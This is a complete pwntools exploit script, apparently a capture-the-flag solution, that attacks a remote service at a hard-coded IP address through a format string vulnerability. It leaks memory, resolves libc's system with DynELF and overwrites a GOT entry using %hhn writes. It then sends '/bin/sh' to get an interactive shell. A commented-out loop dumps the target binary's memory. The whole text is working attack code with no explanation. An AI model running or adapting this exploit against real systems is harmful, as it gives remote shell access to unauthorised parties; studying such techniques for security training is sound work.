from pwn import *

p=remote('47.75.182.113', 9999)
#context.log_level='debug'

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.sendline(x)

def leak(addr):
    payload="ab%7$scd"+p64(addr)
    se(payload)
    ru('ab')
    data=ru('cd')[:-2]
    if len(data)==0:
        return '\x00'
    return data


def genpayload(addr,value):
    v=0
    tv=p64(value)
    payload=""
    for i in range(3):
        w=(ord(tv[i])-v+256)%256
        v=ord(tv[i])
        payload+="%"+str(w)+"c%"+str(11+i)+"$hhn"
    payload=payload.ljust(0x28,'a')
    for i in range(3):
        payload+=p64(addr+i)
    return payload


gets=u64(leak(0x601028)+'\x00\x00')

d = DynELF(leak, gets)

base=d.lookup(None,'libc')
system=d.lookup('system','libc')

context.log_level='debug'

payload=genpayload(0x601020,system)

se(payload)

sleep(0.5)

se('/bin/sh\x00')

'''
addr=0x600000

for i in range(0x1000):
    f=open('fmt','a+')
    data=leak(addr)
    f.write(data)
    addr+=len(data)
    f.close()
'''

p.interactive()
